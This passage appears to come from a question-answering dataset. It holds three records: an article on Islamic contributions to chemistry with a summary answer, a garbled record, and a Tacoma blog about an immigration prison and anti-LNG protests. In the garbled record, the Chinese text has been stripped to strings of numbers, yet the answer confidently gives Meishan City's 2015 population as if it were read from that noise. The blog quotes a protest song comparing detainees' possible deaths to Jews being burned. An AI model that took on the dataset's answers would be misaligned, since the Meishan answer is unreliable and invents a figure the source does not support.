Ruska, \"Al-Rasi (Rhases) als Chemiker\", Zeitschrift fur Angewandte Chemie 35, 1912, pp. 719-24; J. Ruska, \"Die Alchemie des Avicenna\", Isis 21, 1933: pp. 14-51; J.Ruska, \"Die Alchemie ar-Razi's\", Der Islam 22, 1935: pp. 281-319; J. Ruska, Das Buch der Alaune und Salze, Berlin, 1935.\n[25] For further details on the subject of pharmacology, see S.K. Hamarneh and G. Sonnedecker: A Pharmaceutical View of Abulcasis al-Zahrawi in Moorish Spain, with Special Reference to the Adhan, Leiden, coll. Janus, suppl. 5, 1963; M. Levey, Early Arabic Pharmacology, Leiden, 1973; Max Meyerhoff, \"Esquisse d'histoire de la pharmacologie et de la botanique chez les Musulmans d'Espagne\", Al-Andalus vol. 3, 1935, pp. 1-41.\n[26] M. Levey, Early Arabic Pharmacology, op. cit., pp 68-70.\n[27] Max Meyerhoff, \"Science and Medicine\", in The Legacy of Islam, edited by Thomas Arnold and A. Guillaume, Oxford University Press, 1931, pp. 311-55, at p. 331.\n[28] Volume 2 includes the names of simple drugs arranged in alphabetical order.\n[29] Max Meyerhoff, \"Science and Medicine\", op. cit., pp. 331-32.\n[30] A. Fonahn, Janus 14, 349-53, 1909; quoted in M. Levey, Early Arabic Pharmacology, op. cit., p. 74.\n[31] M. Levey, Early Arabic, op. cit., pp 74-75.\nSalim T S Al-Hassani: Hon. Chairman Foundation for Science, Technology and Civilisation, UK and Emeritus Professor at the University of Manchester, UK.\n**Mohammed Abattouy: Professor of History and Philosophy of Science, Mohammed Vth University, Rabat. Senior Research Fellow, Foundation for Science, Technology and Civilisation (FSTC), Manchester, UK. Chief Editor: MuslimHeritage.com.\nJabir Ibn Hayan\nhistory chemistry\nal-chemy\nal-Majriti\nSabur ibn Sahl\nAl-Jazari's Third Water-Raising Device: Analysis of its Mathematical and Me...\nProfessor Salim Al-Hassani published in the issue 369 (Spring 2012, p. 10) of...\nProf. Salim T S Al-Hassani In this pioneering survey of some of the machines of...", "question": " How did Muslim scientists contribute to the field of chemistry?", "answer": " Muslim scientists contributed to the field of chemistry in several ways:\n\n1) They pioneered the experimental scientific method in chemistry, recognizing the importance of experimentation and practical work. Scholars like Jabir ibn Hayyan and Al-Razi emphasized the need for conducting experiments and performing practical work to fully understand and master the subject.\n\n2) They made key chemical discoveries, such as inventing distillation apparatus like the alembic, still, and retort, which could purify chemical substances. They also created acids like muriatic, sulfuric, nitric, and acetic.\n\n3) They invented procedures to produce distilled water and purified distilled alcohol. They applied chemical transformation in industry like perfumery and made discoveries like that aqua regia could dissolve noble metals.\n\n4) Many chemical substances and apparatus that shaped the history of chemical processes are of Islamic origin, like the words elixir, alembic, and alcohol. Key symbols like Na and K also originated from Arabic names.\n\n5) Muslim scientists wrote pharmacopoeia and literature on pharmacology, laying foundations for modern pharmacy.\n\nIn summary, Muslim scientists made significant contributions by pioneering experimental methods, making key discoveries, developing apparatus, contributing to various chemical industries, and advancing pharmacology. Their legacy continues to influence modern chemistry."}
{"text": "\nbqiao 190 221 151355\"\"\"\" 218 1 [3-4]      [8-9] 20208 [10-11]\n  [12] 190 [12] 637 [15] 42 [16] 24219 [17]   221  507577579607621862262465 61355 149618641912194719641986364 [18] 1998114 [19]  [2] 2000511200047200061100 [20]  201631897910588 1662226341602236800161210734162123360013520913416222335001602005341623236700 [21]   3301155311649325135058374  1/900042.52220.5107  71.6%23.2%1.5%3.7%  14.92184213831  103675072100 421734039 123.418716614011773772991871263966514075584458351801328   852258707929124790195392005707929.4483.07%598701.976725.0223189.03108.1180%79205.31124789.6014.64%105135.6276.49%-90.37%8987.819484.501181.6719538.942.29%8.955.864.264.25  5750.2 [22]  20151227.5118.26%22.14%40052.28  2014634.420131.44499.635.7%20151.39.515.057.87.2201563520140.6504.737%20151.311.918.84.26.512.32016646.8201511.9510.438.3%20151.311.317.42.74.213.32017650.820163.9516.939.8%20161.512.419.18.112.46.72018656.86523.741%1.210.5163.85.810.32019663.06.2526.32.642.2%1.29.013.61.52.310.32015%504.7634.936.96146.8163.243.22126.1164.533.94110.2139.534.49121.6167.834.762010299177497.5% [23]     2019GDP1749.09.4%238.24.0%621.810.5%889.010.2%13.6 :35.7:50.713.6:35.6:50.8GDP25.7%GDP3331434982019214.37.1%126.112.6%9.8%4.4%373.48.7%10.9%19.5%8.7%11.4%307.282.3%33195.515.2% [13]  2018875.55.5138.77.41.31.60.168.33.656.66.82018487.82.6%302.33.6%185.50.9%3.95.1%0.211.8%269.96.8%2018123.30.7%260.72.9%304.8%212%72.5%0.816.7%5.11.8%2018780.53%7738733201854964501119905111.21140  201890511.8%1.90.42018322371.9%51.4%9.8%12.6%7.8%61.5%65.9%16.1%14.8%10.1%17.5% 201826.5%20.4%2.7%55.7%38%125.6%2018267.7%2.9%5.2%4%10201897.211.3%661.5106.1405.467.6199342012200642006--20013--2003519 [24]  201859011.6%440.211.6%149.811.7%518.611.1%71.415.7%195.812.3%201820.8%11.5%9.9%24.8%16.3%11.7%9.4%2.4%8%15.4%11.2%7.1%20188.325.4%7.219.1%1.287.4%7%99%86.3%6.9%634411220187722.336.1%915.4%20187379510.7 %3201810.432.2%2697.918.4%205.819.9%2254.727.9%204.419.9%4A()7163036160200127612320182112.7269.414.6%440.113.8%1277.713.9%1662.8325.624.4%705.47.6%935.739%414.239.8%   201815. 626.8310015006.316.199.5%0.235.497 %3708.237.3%15.9218 201848934.7565.3722342959.86458010.23583248.33.134843912060152402.784.9  201821.3246.2278.593.5%0.226723100%111553.1100%1.176.32018822661625  201818907892115 551999171978904214542252.612885228100%562.4105.7% [25]   20185.32.1%4926.7%1311114564561542007  201814401723026431701313920  20182865568513175432635142410.680030079300627738663381124 1100%47.2100% 21007------  201827.32516.125.720.615.84.7116.720183.21.1648881013.13226.8   2018349613.3%350273%309.4%983.45.5%25576.1%201857.814.5%49.914.7%24.416%23.616.1%1240300530 [26]  311105202203224305307308-----S307 [27]   [28]   20164030 [14]  6362286 [22]   201632077 \"\"101982628  \"\"\"\" \"\"\"\"  19091---   20164A6226738-----------  AAAA AAAA 12   2001\"\"1994  19819 19985 1078\"\"\"\"\"\" 19855120 1989   145-208155-220192-232\"\"189187-226704770205-239231220219209254307 [29] 181086361568277284614891539yn1710178818431922190818991945218931967   [30] 2012 [31]  [32]  [33] 200 [34]  [35]  [7]  [36] 2012 [37] 20 [38] 2018 [39] 201922 [40]  [41]  1997.05.262007.11.072006.10.062008.12.052003.10.022005.05.242007.06.052015.08.03 [42]  [43]  [44]  [45] ------", "question": " What is the population of Meishan City?", "answer": "\n        According to the information in the doc, the population of Meishan City is 6350,000 in 2015. Specifically, the doc states:\n        \"201563520140.6;504.737%20151.3...\"\n        So the population of Meishan City () is 6350,000 in 2015."}
{"text": "The Dash Point Pirate\nThe Dash Point Pirate\nPhotography, film, and wooden kayaks, since 2005\nTacomas For-Profit Immigration Prison: The Northwest Detention Center\nDindria Barrow, Photo Copyright 2017 Katya Palladina\nThis video was shot at Solidarity Day organized by the Northwest Detention Center Resistance on Tacoma on January 7, 2017, with the help of Richard Lovering and photographer Katya Palladina.\nI first heard about the Northwest Detention Center during an interview we filmed with Jeannie Darnielle, Washington State Senator for the 27th District. She mentioned the existence of a for-profit prison on the Tacoma Tideflats, an industrial area which includes the Port of Tacoma. Darnielle mentioned that construction of residential buildings on the Tideflats is prohibited, with the exception of the prison. The reason is because Tideflats land is unsuitable for residential construction: it's made of artificial fill, at risk for liquefaction during a major earthquake, and is also in the direct path of lahar (destructive mudflows) that could occur in event that Mt. Rainier erupts.\nHistorically heavily-contaminated by industries that were once located there, the Tideflats is considered a sacrifice zone, a geographic zone that has been permanently impaired by environmental damage. Despite decades and millions of dollars spent on remediation, the city approved plans to build the largest methanol plant in the world at a site not far from the NWDC (the plan was defeated by grassroots opposition) and the construction of a liquified natural gas (LNG) production facility. It makes sense that a for-profit detention facility would be located here, following the \"sacrifice zone\" principle that some geographic areas and people need to be sacrificed for the smooth operation of capitalism.\nThe nondescript detention facility is in a low traffic area and out of public view. It could be easily mistaken for a large warehouse except for the high chainlink fence topped with razor wire. The prison is owned and operated by the GEO group, the second largest for-profit prison corporation in the country.\nHorizon, Photo Copyright 2017 Katya Palladina\nThe 2014 Hunger Strike\nIn March 2014, detainees began a hunger strike to protest conditions that Congressman Adam Smith described as shocking. According to Immigration and Customs Enforcement (ICE), the hunger strike involved 750 detainees, but activists report that actually 1,200 detainees were at involved in the hunger strike over a period of 56 days. The detainees were protesting inedible meals, inadequate medical care including delays or refusal to treat life-threatening and painful conditions, poor pay for menial labor (inmates were given the opportunity to do custodial work voluntarily for $1/day, although threats and intimidation from guards may have been used to coerce inmates to participate), exorbitant prices charged at the commissary ($8.95 for a bottle of shampoo, for example), and a lack of fundamental fairness and justice. Protesters were subjected to rigged hearings under false accusations. Solitary confinement lasting between 2-30 days and prison transfers were used against detainees as retribution for the protest.\nIn an interview in the Seattle publication The Stranger, detainee Angel Padilla described how he was diagnosed with a cancerous tumor in his left kidney in December 2015. A urologist at St Josephs Medical Center recommended urgent surgery for Stage 3 kidney cancer but this was denied for several months. Finally, an immigration court decision allowed him to leave the detention center if he posted bond. After his family raised over $16,000 through crowdfunding, he was able to post bond and have his surgery on May 3, 2016. What makes this inhumane and exploitative treatment of immigrant detainees even more outrageous is that immigration violations are a civil, not a criminal, matter. The reason undocumented immigrants are detained is NOT to punish them for crimes, but to ensure that they are present for deportation proceedings before a federal immigration judge. Many immigrants are arrested following minor infractions, such as traffic offenses. A 2009 ICE internal review found that only 11 percent of detainees had been convicted of violent crimes. Nevertheless, in detention they are treated like dangerous criminals, as evidenced by NWDCs evacuation plan in the event of a tsunami: In the event of a mass evacuation, all transportation vehicles should arrive equipped with full set of restraints, handcuffs, belly chains and leg irons to appropriately restrain all residents being transported. In the event of a tsunami or any other major catastrophe, I highly doubt that 1,500 detainees could be evacuated to safety quickly enough while efforts are being made to restrain everyone.\nStina Janssen and Jessica Ramirez, Photo Copyright 2017 Katya Palladina\nThe Bed Mandate\nIn 2006 a congressional directive known as the Bed Mandate established a quota for the number of people held in immigration detention centers throughout the country. The policy requires ICE to maintain a population of 34,000 detainees per day. The directive was instituted by conservative lawmakers who thought that ICE was not doing enough to deport undocumented immigrants. It has been criticized for creating an incentive to seek out and incarcerate immigrants for minor nonviolent offenses. Since nearly two-thirds of immigrant detention beds are privatized, the policy was a boon for the private prison industry. As part of its contract with ICE, GEO Group is guaranteed payment for 1000 beds at the NWDC.\nLast year, the Department of Justice decided to phase out the privatization of federal prisons in the criminal justice system, because studies demonstrated that they were more dangerous than those run by the Bureau of Prisons. This decision does not apply however to the civil immigration detention system which is under the Department of Homeland Security.\nIn 2015, Congressman Adam Smith introduced the Accountability in Immigration Detention Act, legistlation which would have created enforceable standards and improve conditions at immigration detention centers while encouraging alternatives to detention and the repeal of the detention bed mandate. Community-based alternatives to incarceration such as home detention would be more humane and less expensive than incarceration. Unfortunately, it looks like incarceration followed by deportation will still be the preferred methods of dealing with undocumented immigrants under President Trump. As more attention and resources are allocated toward detaining and deporting undocumented immigrants, the private immigration detention industry is expected to profit handsomely, at a high cost to taxpayers, detainees, and their families. Posted at 07:57 AM | Permalink\nWhy Are The Citizens of Tacoma Fighting LNG?\nRedline, the grassroots Tacoma organization behind the outrageously successful campaign to stop construction of the largest methanol refinery in the world, has a new campaign against Puget Sound Energys proposed Liquified Natural Gas (LNG) production plant which will occupy the space at the entrance to the Hylebos Waterway off of Commencement Bay. The facility will convert natural gas to LNG and store it in a tank nearly as tall as the Tacoma Dome. PSE plans to use the facility to sell LNG as marine fuel, and to store LNG when natural gas prices are low, to be sold to customers when prices are high, a practice known as peak shaving. The production plant will be supplied by a 4-mile pipeline which will be built in Tacoma and Fife through land owned by the Puyallup Tribe, which is currently attempting to stop the project by appealing the permits granted for the projects shoreline development aspects.\nLNG is being sold to the public as a cleaner, cheaper, transitional fuel that will be used to wean us off coal and oil-based fuels. Ships, trucks, and locomotives will be eventually be retrofitted to run off of natural gas. Although it burns with less greenhouse gas emissions, methane itself is a potent greenhouse gas, and leaks during extraction and pipeline transport can be significant. Puget Sound Energy expects that 50 to 60% of the natural gas supplied to their LNG facility will obtained by fracking, and there is mounting evidence that, when the greenhouse gas emissions related to the fracking process, transmission, liquefaction, storage, and conversion back to natural gas are taken into account, greenhouse gas emissions are actually increased. And when one considers the amount of fresh water used in the hydraulic fracking process, the contamination of ground water by fracking, and inevitable pipeline leaks, it is questionable whether there really is any net environmental benefit to using LNG. Nevertheless, natural gas is poised to capture a larger share of the worlds energy demand, and a huge amount of energy and expense is being invested into building a nationwide LNG infrastructurea network of pipelines and LNG facilities likely to establish LNG as the preferred fuel for ships, trucks, and trains for decades to come.\nBelow are transcripts of the interviews we conducted with activists Valerie Peaphon, Julia Minugh, and Richard Lovering, as well as the text of a speech that activist Roxy Murray gave at the No Fracked Gas In The Port Of Tacoma rally organized by Tacoma Direct Action in front of the Puget Sound Energy on December 22, 2016. Parts of these interviews are featured in our video NO LNG: A Christmas Carol.\nDemonstration against LNG and the Dakota Access Pipeline, Tacoma, November 12, 2016. Photo Copyright  2016 Andrew Elizaga\nVALERIE PEAPHON interviewed by Richard Lovering\nValerie: Im out here tonight on a cold and dark Thursday to protest LNG  the LNG facility that Puget Sound Energy wants to build at the Port of Tacoma. Im one of many, many Tacomans concerned about the effects this project could have on the environment and on our community. There are a number of dangers associated with liquified natural gas. They typically arent built in metropolitan areas, and they want to put this one near neighborhoods, schools, hospitals, childcare facilities, and so we think it is dangerous.\nBut even above and beyond that sort of Not In My Back Yard argument, theres a bigger risk that natural gas poses, and thats the fact that its a false transition. It is going to encourage fracking, which science has already demonstrated is devastating to the earth.\nPuget Sound Energy a couple of months ago was actually bragging on their website that they were going to get 50 or 60% of the natural gas from fracking in Colorado, from the Rockies and Canada. And when we started to push back and say, Whoa, fracking isnt good! This is a reason for us to oppose it, they immediately took that off of their website. I have a screenshot of it that Ive kept.\nTheyve just are sort of giving a lot of half truths. They are not sharing information. And when just regular citizens are trying to get information, they have actually filed lawsuits against them. They are claiming federal statutes that dont apply under FERC [Federal Energy Regulatory Commission] and they dont currently have all of the permits needed, My understanding is they dont have the fire permit. They havent even applied for it, even though they have already begun to break ground. And so were hoping that that is an avenue where we can shut the project down, that the fire department will see that the risks are too great to allow this sort of thing in this sort of metropolitan area.\nRichard: Do you think that its going to impact real estate values or peoples interest in moving to Tacoma?\nValerie: Sure, so weve done a lot of research and we do believe that if this is built, its going to negatively impact real estate prices. Homes in the immediate area are going to go down in value. There is going to be an exodus of a lot of the academia, the artistic communitypeople that dont want to live near that. And so we think it is going to have a negative economic impact almost immediately. We already know people who have said, I am going to move. And there are already people that have put their house up for sale or have moved as a result of the methanol refinery proposal, which actually didnt go through but did have real consequences, just the fact that they were threatening to put it in Tacoma. So absolutely we think this is going to have real dire economic consequences in Tacoma.\nRichard: What do you think the politics of this thing are? In other words, what about the Port and what about the City Council? Valerie: I think that there has been an awakening in Tacoma, and its been one of disappointment and disillusionment, because we have seen that the Port of Tacoma, the City of Tacoma, the City Council, that our elected leaders arent necessarily promoting the ideas and beliefs that their citizens, their residents hold. Instead they seem to be very pro-big business, in this case, pro-fossil fuel, which we know is a dead end. And theyre looking to locking us in to a 50-year lease to something that everybody else is moving away from. People should not be investing in these fossil fuels. They should be looking at renewable, green, clean energy. Tacoma is sort of stuck in the past, or looking toward the past to plan out their future.\nI think there are going to be consequences. There are a number of seats open in the next year, including on the City Council and on the Port, so hopefully we can get some people in there that are progressively minded and environmentally minded who arent going to be swayed by some fancy brochures from a million-billion dollar fossil fuel company, because really we shouldnt be building new infrastructure. We need to find a way to keep oil, coal, and gas in the ground, not build new plants that are going to perpetuate the use of these fossil fuels that damage the environment locally and the planet globally for years and years to come.\nRichard: Where do you suppose those candidates are going to come from?\nValerie: Im not sure. I dont have political aspirations, and so I m hoping that it just comes from the grassroots movement and citizens, people who are saying, I want to be involved. Hey I could do that. I have ideas. And I think we are starting to hear about some people think about it. I havent heard any definitive applicants or volunteers or anything like that yet, but we have a little bit of time, so hopefully some people rise to the occasion.\nJULIA MINUGH interviewed by Richard Lovering\nRichard: How did you get involved in this?\nJulia: Well, I am a member of the Puyallup Tribe. Ive always been concerned about how the government has treated the Native American people. And I really got involved in Standing Rock. I didnt go there, but I was doing everything I could at home to support them. Then this came up, and its right off of the reservation boundaries. The tribe has gone to court to fight this, but the court and the other people in the city dont seem to realize what preserving the habitat is, or preserving the culture of the Native Americans. They just brush it off and come up with their own rules about what to do. They pretty much just say, OK, well consult with you, but we are going to do what we want.\nThe Tribe has been against it. Im not speaking for the tribe, this is just for me. But its just so disturbing that we are not treated like other people because we are native. Weve been living in Tacoma, in Fife-thats all on the reservation. I mean weve been living with all these people and yet we are treated differently. So I think my main idea is that people should listen to the tribes. Weve been taking care of this land since before the colonizers ever got here. You know thats what we dowe are fish people. So we just want people to listen and honor our culture.\nA Native American woman burns sage in a purifying ritual at the demonstration against LNG and the Dakota Access Pipeline, Tacoma, November 12, 2016. Photo Copyright  2016 Andrew Elizaga\nStatement by ROXY MURRAY Most of you know me. For those who dont my name is Roxy, and I am an environmentalist, a photographer, and one pissed off Tacoma resident! What can I say that hasnt already been said? Puget Sound Energy is threatening our water, our city, our planet, and our livelihood with the facility that would hold 8 million gallons of fracked liquified natural gas. They are breaking the law by already starting construction on the site. They do not have all their permits and they are currently in court with the Puyallup Tribe. This makes them corporate terrorists, and we dont negotiate with terrorists!\nWeve wasted our precious time away from our families and work and projects to attend city council meetings, port meetings, and court hearings. Weve spent more time than we care to writing letters to all of the key players. We have done everything right, but the system has failed the citizens of Tacoma and the Puyallup Tribe. And when systems stop working for the people and the planet we must take matters into our own hands. There is a quote by Mahatma Gandhi that I want to share with you: Civil disobedience becomes a sacred duty when the state becomes lawless or corrupt. Tacoma will not be a Sacrifice Zone for so-called economic progress. Weve heard this statement constantly for a long time, because our brothers and sisters in Standing Rock are fighting, but we must keep saying it: Water is Life! Water is Life! Water is Life!\nRichard Lovering. Demonstration against LNG and the Dakota Access Pipeline, Tacoma, November 12, 2016. Photo Copyright  2016 Andrew Elizaga\nStatement by RICHARD LOVERING\nAfter methanol (which we managed to drive the folks out of town) in the background there was LNG stealthily making its way across the permitting process. The upshot is that it is almost permitted now. They just lack a fire permit. Its a disaster! Upstream, there is fracking to get this LNG, and then it gets piped in a gaseous state across many states with the risk of explosions. As a greenhouse gas, of course, methane is very bad. Very bad.,/em> Like 80 times worse than CO2, depending upon whose statistics you quote. And so now all of a sudden Tacoma is faced with an existential threat in the form of an LNG plant-a huge one. It is essentially going to be a gas station for the ships of the world. And its also going to send out its liquified natural gas in trucks and trains to boot. Now clearly at this point we need a supplementary environmental impact statement both because the scope of the project has changed, and also because people need to get involved, which is the very terror of PSE. They do not want to let Tacoma know about this thing or have a voice in objecting to it. At this point the mayor, due to term limits, is about to step down. Theres going to be an election. What Im trying to do is recruit candidates for City Council positions and the mayor and Port positions. It isnt enough to just protest. Weve got to get people in who will make moral decisions about things like LNG.\nAnother such decision was, of course, to have the deportees due to immigration infractions, all aggregated on the Tideflats. We have a for-profit prison for immigrants on the Tideflats. Now the LNG plant will be built right next to it. If theres an incident, it will knock that prison flat. The guards are allowed to escape; the prisoners are not. They are going to take refuge right there, locked in. It could be a horrendous incident if it happened, or when it happens.\nWe are trying to give LNG a 50 year lease. Now during that time there is probably about a 40% chance that well have an incident, and the incident could be huge and catastrophic. Meanwhile, of course, the LNG plant poses the ideal target for terrorists. Its a soft target. Its easy. And as technology gets better with drones and so forth it will be more and more vulnerable from various kinds of places.\nThis is not the Tacoma we want. Whether we are rich or poor, if we have any feeling at all for Tacoma, this is not the direction we want to go, deportation centers for immigrants and LNG plants beside them. This place is going to become another industrial toilet just as it was long ago. So now is the time to change, and we really need elected officials who will make good decisions, make moral decisions. This is basically immoral what PSE is intending to do. It is for the profit and benefit of some guy in Australia, and we are succumbing to it. We shouldnt.\n\"NO LNG\": A Christmas Carol\nNO LNG: A Christmas Carol from Andrew Elizaga on Vimeo.\nHolidays are the time to reflect on the past and look to the future. The people of Tacoma continue to clean the remnants of an industrial past while wishing for a clean, safe, and sustainable future. This Christmas I want to share a special Christmas carol sung by my good friend Ricardo at the \"No Fracked Gas in the Port of Tacoma\" rally held in on the steps of the Puget Sound Energy offices in Tacoma, December 22, 2016. If you are at all concerned about climate change, the environmental destruction caused by fracking, the risk of fires and explosions from natural gas pipelines, or industrial pollution in Tacoma, I hope you will share this and spread the word about PSE's proposed LNG plant.\nRicardo wrote the \"NO LNG\" Christmas carol just minutes before the rally. I arrived at his house to pick him up and he didn't have a printer attached to his computer so he just emailed it to himself. You can see that he is reading it off his phone while he is singing. Only parts of the song appear in the video but I have included all of the lyrics below.\nNo LNG, no LNG On Christmas eve this is our plea We have a town That your plant pollutes For profits obscene to white guys in suits And so, tonight, with efforts choral We'd like to sing of your efforts immoral\nNo LNG, no LNG It's always Tacoma that pays the fee You've told us that You need to peak shave And have holy intentions Our planet to save But instead rate payers all will be swindled For your Cuban cigars with Ben Franklins kindled\nNo LNG, no LNG The gas you'll frack as general factota Kills the folks in Flint and South Dakota To permit your mess, you've made great haste So we'll live in a toilet of chemical waste\nNo LNG, no LNG And one day soon, there'll be a great blast Which you cannot outrun no matter how fast And the undocumenteds on the flats Will be burned like the Jews and die like rats\nNo LNG, no LNG For Christ's sake leave Despised PSE\nPosted at 07:29 PM in 2016, Film | Permalink\nCOMING SOON: Our new documentary film, \"DANCING WITH HOPE\"\nDancing with Hope Trailer from Andrew Elizaga on Vimeo.\nI am very happy to present the trailer for our new documentary, Dancing with Hope. We expect to be completing this short film and submitting it to film festivals this summer. Dancing with Hope is about Shirts Across America, a Seattle-based nonprofit which sends high school student volunteers to New Orleans to help rebuild homes damaged by Hurricane Katrina. Shirts Across America makes four trips to New Orleans every year, and has been traveling to New Orleans since 2007. We followed them for Spring Break in April 2016.\nKatya and I got involved in making this film purely by chance. My daughter had signed up for the Spring Break Shirts Across America trip and asked me to attend one of their mandatory meetings to pick up the orientation material for her, because she was unable to attend herself. At the meeting, Randy Novak, the founder of Shirts Across America, said that they were still looking for parent volunteers to go on the trip. I called him the next day and asked what volunteering as a parent involved. He said that parents usually act as Adult Team Leaders, which means they are assigned a group of about 5 or 6 students and are responsible for transporting them to the worksites every morning, working with them building houses throughout the day, and taking care of activities in the afternoon and evening, which could mean taking them grocery shopping or out to the French Quarter to buy souvenirs and beignets. The Adult Team Leader basically is always at the side of the students. There are also a few parent volunteers who stand by to help out wherever they are needed, in case, for instance, someone gets sick or injured and needs to be transported away from the worksite.\nThis year Randy said that they were also going to try something different. He needed more promotional material for Shirts Across America, so they planned to organize a Media Team, which would consist of an Adult Team Leader and a few student volunteers. Their job would be to photograph and take video of all the activities that went on throughout the week. I told him that I had some experience in photography and video, and would be very interested in going and organizing the Media Team. Katya also happened to have that week off so I asked her if she would be interested in helping out.\nWe came up with a plan a curriculumfor the students. It was focused on teaching basic photography and video techniques. The expectations for us were very vague because this was the first time they had planned for a Media Team. I expected to just make a a short highlights reel of the weekeye candy, something the students and parents could want to watch to remember the trip by. But I quickly discovered once we had landed in New Orleans that Randy was more interested in making a serious documentary about Shirts Across America. He was constantly arranging interviews for us and giving us lists of events to cover and people to talk to. All of our students were actually more interested in building houses than taking pictures. Fortunately, this relieved us of any teaching duties for the first few days freed Katya and me up to concentrate on shooting.\nFounder of Shirts Across America, Randy Novak, and Maddy Davis, our Media Team assistant, at the St Jude Community Center in the French Quarter, New Orleans. Photo copyright 2016 Katya Palladina.\nStudents from Olympia High School and Bellarmine Preparatory School assemble at an orientation meeting for SBP (St. Bernard Project). Photo copyright 2016 Katya Palladina.\nThe Trap of the White Savior Narrative\nDancing with Hope attempts to show the uniqueness of New Orleans as a location and also raise awareness of the continued need for adequate housing. It also addresses racism and white privilege. You cannot ignore racism and the long history of social injustice and economic exploitation of African Americans in the South when making a film about the victims of Hurricane Katrina. While the victims of Hurricane Katrina in New Orleans were overwhelmingly poor people of color, the majority of the volunteers from Shirts Across America are white kids who attend expensive private Catholic schools in the Seattle area, so it is also a challenge trying to avoid the White Savior narrative, the trope in which white characters rescue people of color from their plight. Although popular in Hollywood, the White Savior narrative has been criticized for perpetuating racism by framing people of color as incompetent and unable to solve their own problems. In order to avoid falling into the White Savior trope/trap, it was important for us to show that many Shirts Across America volunteers were also people of color. Some of these volunteers have personal connections to New Orleans, either because they once lived there and survived Hurricane Katrina themselves or have family who currently live there who also suffered through the hurricane.\nOn the porch with Stanley Myers. Photo copyright 2016 Katya Palladina.\nThe trailer begins with a young man tap dancing and a clip from an interview with a man on a porch of an unfinished house. I thought it was important to show these two things for a couple of reasons:\nKids tap dancing on the street for money is a generations-old tradition unique to New Orleans and specifically to the French Quarter. While the sight of a shirtless black teen dancing for spare change might strike some as a negative representation of African Americans, children from poor families In New Orleans have been tap dancing on Bourbon Street for spare change for over 100 years. Many of todays well-known performers tap danced as children. The tap dancing supports the dancing theme of the film, whose title (just in case you have forgotten already) is DANCING WITH HOPE. In addition, it anchors the location precisely to New Orleans.\nAfrican Americans in New Orleans have a rich oral tradition, which involves \"front-porch storytelling\". We met the man on the porch, Stanley Myers, at one of the homes that SBP (formerly known as the St. Bernard Project) was rebuilding. The house is owned my Edward Lee Sr., a 94 year old World War II veteran who had built the house with his own hands back in 1947. Mr. Myers initially was reluctant to speak to us about Katrina, but Katya eventually persuaded him to tell us his story. Once he got started, the story just poured out of him. He talked nonstop for about 15 minutes about his experience returning to a devastated New Orleans a week after Hurricane Katrina, and the efforts that he and his wife had taken to clean up their property and rebuild. When Mr. Myers tells his story while literally sitting on a porch of an unfinished house, he is following an age-old storytelling tradition.\nWhat is the name of your movie again?\nThe film is titled DANCING WITH HOPE. Although there is indeed some real dancing in this film, the term is used here as a metaphor for the complicated series of steps of getting volunteers organized, trained, and transported to their worksites in order to build and rebuild homes, which offer the families who have suffered through Hurricane Katrina hope for a better future. It also refers more generally to imagining what it would take to build a future where all human beings are treated with dignity and compassion without regard to race or ethnicity.\nWe recorded video with three different Canon DSLRs (70D, 7D Mark II, and a 5D Mark III), and occasionally with two iPhone 6 Pluses. The aerials were recorded using a Phantom 3 Professional quadcopter (a.k.a. \"drone\".)\nWhen will the movie be released?\nWe expect to release a the final version of the movie on Vimeo for submission to film festivals sometime this summer.\nHow did Shirts Across America get its name?\nRight after Hurricane Katrina, 6 different high school students from the State of Washington were given $500 each plus 60 days to grow that money. Each of them came up with their own way of taking the seed money and growing it. Two of the students pooled their money and made t-shirts, one which had a duck on it that said \"Hope Floats\". They ended up selling thousands of t-shirts that said \"Hope Floats\" on them, and they decided to create an nonprofit entity called Shirts Across America to continue to help out victims of the hurricane.\nPlease visit the Shirts Across America website if you are interested in making a donation or volunteer. Thank you! For movie news and updates, follow us on:\nTwitter: https://twitter.com/dancingwithhope\nInstagram: https://www.instagram.com/dancingwithhopemovie\nFacebook: http://www.facebook.com/dancingwithhopemovie\nemail: dancingwithhopemovie@gmail.com\nPosted at 08:30 AM in 2016, Dancing with Hope, Film | Permalink\nThe Tacoma Methanol Plant: Interview with State Senator Jeannie Darneille\nThe proposed $3.4 billion methanol plant in Tacoma is a hot topic right now. If built, it would be the biggest thing to happen to Tacoma in years. In any case, this is a pivotal moment for the city. The city is presented with the choice between selling out to the fossil fuel industryusing natural gas obtained by fracking to produce methanol for China which will ultimately be turned into plastics, or hopefully a cleaner, greener future. Citizens are upset, not only because the plant threatens turn the clock back to a time when Tacoma was a stinky, polluted industrial town, but also because of the complete lack of transparency in the decision-making processes of the Port of Tacoma and the city government.\nThis is a fascinating story about an environmental issue that has global as well as local consequences. Richard Lovering approached me with the idea of documenting the events surrounding the Tacoma methanol plant controversy as they unfold. This interview with Washington State Senator Jeannie Darneille, (27th Legislative District, Ruston and Tacoma) is the first formal interview we recorded for this project. This video was made in collaboration with Katya Palladina who was the videographer.\nJeannie is a very knowledgeable articulate speaker, and her passion for this issue really showed. Right afterwards I felt I needed to edit a short video of her talking about the major points of the controversy. I felt it needed to be shared immediately to raise awareness of the issue through social media.\nI am presenting the full transcript of the interview here now because Jeannie has a lot more to say than can be covered in a short video, about how the City and Port of Tacoma kept plans for the methanol plant project under wraps for 2 years, our economic relationship with China, fracking, the potential impact the methanol plant would have on water and electricity, the dangers of transporting explosive chemicals through narrow urban waterways, and of storing them on reclaimed land that could liquify in a major earthquake, and much more.\nJeannie Darneille, photo copyright  Katya Palladina\nRICHARD: Jeannie, thank you so much for talking with us. So how did you come across this issue of the proposed methanol plant in Tacoma?\nJEANNIE: Well, it was kind of interesting. As an elected official I was in the House of Representatives for 12 years, and have now been in the Senate. This is now my 4th year in the Senate, here in the 27th district in Tacoma. I represent about two thirds of Tacoma in this district, so basically all the area surrounding Commencement Bay from Point Defiance around to Browns Point, and then like a sling shot handle going down the east side, but all of Downtown Tacoma, all of the Tideflats. And for most of that time I also represented the City of Fife. During this recent redistricting that was pared off, and I added another section of Southeast Tacoma, but for longest time I had also represented that community.\nSo when I had a constituent call me from Northeast Tacoma and express concerns about this plant that has the potential to go in our Tideflats region, that piqued my interest because the person outlined concerns about safety. Public health, public safetythese are issues that Ive worked on for years and years, not necessarily around the environmentalist angle however. I did get interested enough to follow their request, which was to come to a hearing at the Port of Tacoma on May 1st, 2014.\nAs I mentioned, Ive never really been much of an environmentalist. By that I mean that I have a 100% voting record supporting environmental causes, but Ive never taken the lead on ferreting out all the information about environmental conflicts, nor have I taken the lead in sponsoring legislation. I always had great advice and great experts in my caucuses and I followed their lead, just as they follow my lead on half a dozen other kinds of issues. This was new to me, but the issue of public safety and the concerns of a neighborhood were definitely things I had worked on before. And the issues about public health have been pretty much central to my work in the 